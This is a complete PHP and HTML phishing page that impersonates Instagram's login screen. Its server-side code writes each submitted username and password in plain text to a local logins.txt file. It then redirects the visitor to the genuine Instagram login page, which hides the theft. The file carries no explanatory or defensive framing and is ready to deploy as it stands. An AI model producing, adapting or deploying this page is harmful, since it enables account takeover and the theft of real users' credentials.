<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $file = fopen("logins.txt", "a");
    fwrite($file, "Instagram | Username: " . $_POST["email"] . " | Password: " . $_POST["password"] . "\n");
    fclose($file);
    header("Location: https://www.instagram.com/accounts/login/");
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Instagram - Log In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #fafafa;
        }
        .container {
            width: 320px;
            margin: 100px auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }
        img {
            width: 120px;
        }
        input, button {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ddd;
        }
        button {
            background: #3897f0;
            border: none;
            color: white;
            font-size: 16px;
        }
        button:hover {
            background: #2675d7;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        <h2>Instagram</h2>
        <form method="POST">
            <input type="text" name="email" placeholder="Phone number, username, or email" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>

